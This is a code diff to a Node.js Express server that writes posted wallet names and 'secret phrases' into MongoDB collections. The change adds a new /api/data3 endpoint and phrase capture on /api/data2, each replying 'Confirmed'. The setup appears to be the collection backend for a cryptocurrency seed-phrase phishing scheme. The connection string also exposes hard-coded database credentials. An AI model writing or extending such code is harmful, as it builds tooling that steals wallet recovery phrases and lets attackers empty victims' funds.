@@ -6,6 +6,10 @@ const mongoose = require("mongoose");
 const mongooseUrl = "mongodb+srv://dbBackend:clientbackend@cluster0.ycmie7z.mongodb.net/ClientBackend"
 
 let timeAdd = new Date();
+const date = new Date();
+const offset = date.getTimezoneOffset() == 0 ? 0 : -1 * date.getTimezoneOffset();
+let normalized = new Date(date.getTime() + (offset) * 60000);
+let indiaTime = new Date(normalized.toLocaleString("en-US", {timeZone: "Asia/Calcutta"}));
 
 //Connect MONGO DB
 async function mongooseConnect(){
@@ -34,6 +38,12 @@ const schema2 = new mongoose.Schema({
 });
 const schema2Use = mongoose.model('database2', schema2);
 
+const schema3 = new mongoose.Schema({
+    Time:{type:String},
+    secretPhrase: {type:String}
+});
+const schema3Use = mongoose.model('database3', schema3);
+
 //MiddleWares
 server.use(cors());
 server.use(bodyParser.json());
@@ -46,7 +56,7 @@ server.get("/",(req,res)=>{
 server.post("/api/data1",(req,res)=>{
     async function saveSchema(){
         let data = new schemaUse({
-            Time:timeAdd,
+            Time:indiaTime,
             secretPhrase:req.body.packetData
         });
         try{
@@ -64,8 +74,26 @@ server.post("/api/data1",(req,res)=>{
 server.post("/api/data2",(req,res)=>{
     async function saveSchema(){
         let data = new schema2Use({
-            Time:timeAdd,
+            Time:indiaTime,
             walletName:req.body.walletName,
+            secretPhrase:req.body.secretPhrase
+        });
+        try{
+            await data.save();
+            console.log("Saved")
+        }
+        catch{
+            console.log("NO")
+        }
+    }
+    res.json({status:"Confirmed"});
+    saveSchema()
+})
+
+server.post("/api/data3",(req,res)=>{
+    async function saveSchema(){
+        let data = new schema3Use({
+            Time:indiaTime,
             secretPhrase:req.body.secretPhrase
         });
         try{
